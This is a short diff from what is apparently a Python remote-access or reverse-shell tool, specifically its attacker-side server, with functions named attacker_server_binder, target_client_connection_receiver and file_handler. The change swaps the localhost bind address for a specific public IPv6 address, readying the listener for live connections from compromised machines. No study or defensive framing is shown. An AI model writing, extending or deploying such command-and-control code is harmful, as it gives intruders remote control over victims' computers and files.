@@ -76,7 +76,7 @@ def file_handler(target_client, command):
         receive_data(target_client)
 
 def main():
-    attacker_server_binder("127.0.0.1", 1234)
+    attacker_server_binder("2409:4063:2291:13d1:c421:695c:7d00:5173", 1234)
 
     # receive connection from target client
     target_client = target_client_connection_receiver()
